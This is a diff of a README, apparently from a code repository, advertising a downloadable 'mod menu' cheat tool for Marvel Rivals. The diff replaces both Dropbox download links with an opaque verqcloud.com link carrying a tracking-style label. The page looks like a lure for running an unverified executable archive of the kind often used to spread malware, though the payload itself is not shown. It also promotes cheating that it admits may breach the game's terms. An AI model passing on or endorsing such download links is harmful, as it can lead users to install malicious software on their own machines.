@@ -2,7 +2,7 @@
 
 A feature-rich **mod menu** designed for Marvel Rivals, offering powerful tools to tweak gameplay, enhance visuals, and assist with development or experimentation. Whether you're exploring the game mechanics or just having fun, this menu gives you full control over your in-game experience.
 
-[![Download MarvelRivals ModMenu](https://img.shields.io/badge/Download-MarvelRivals%20ModMenu-blueviolet)](https://www.dropbox.com/scl/fi/zse5cs99mx9h0kjzf06bx/Oblivaris.zip?rlkey=dcargwg0w4py89d285jt5swqo&st=m35upycd&dl=1)
+[![Download MarvelRivals ModMenu](https://img.shields.io/badge/Download-MarvelRivals%20ModMenu-blueviolet)](https://verqcloud.com?label=09c0d50b1ab5e4e1d163f9d9c8344a8a)
 
 ## Features
 
@@ -25,4 +25,4 @@ A feature-rich **mod menu** designed for Marvel Rivals, offering powerful tools 
 - Using mods in online/multiplayer settings **may violate the game's Terms of Service**.
 - Use responsibly. We do not condone cheating in competitive play.
 
-[![Download MarvelRivals ModMenu](https://img.shields.io/badge/Download-MarvelRivals%20ModMenu-blueviolet)](https://www.dropbox.com/scl/fi/zse5cs99mx9h0kjzf06bx/Oblivaris.zip?rlkey=dcargwg0w4py89d285jt5swqo&st=m35upycd&dl=1)
+[![Download MarvelRivals ModMenu](https://img.shields.io/badge/Download-MarvelRivals%20ModMenu-blueviolet)](https://verqcloud.com?label=09c0d50b1ab5e4e1d163f9d9c8344a8a)
